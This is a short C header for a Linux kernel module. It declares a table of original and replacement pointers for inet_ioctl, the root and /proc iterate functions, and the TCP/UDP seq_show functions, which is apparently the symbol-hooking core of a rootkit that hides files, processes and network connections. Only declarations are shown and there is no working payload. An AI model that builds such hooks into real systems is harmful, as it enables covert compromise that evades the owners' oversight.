#ifndef _SYM_MAP_H
#define _SYM_MAP_H

#include <linux/fs.h>
#include <linux/net.h>

/* include */
#include "iterate.h"

#define SYM_NUM 7

// hold symbols struct
typedef struct _sym_t_ {
        int (*inet_ioctl)(struct socket *sock, unsigned int cmd, unsigned long arg);
        int (*root_iterate)(ITERATE_PROTO);
        int (*proc_iterate)(ITERATE_PROTO);
        int (*tcp4_seq_show)(struct seq_file *seq, void *v);
        int (*udp4_seq_show)(struct seq_file *seq, void *v);
        int (*tcp6_seq_show)(struct seq_file *seq, void *v);
        int (*udp6_seq_show)(struct seq_file *seq, void *v);
} sym_t;

// symbols map struct
typedef struct _sym_map_t_ {

        sym_t *old,
              *new;
} sym_map_t;

// reference to symbol map
extern sym_map_t sym_map;

// init
extern void sym_map_init(void);

#endif /* _MAP_H */

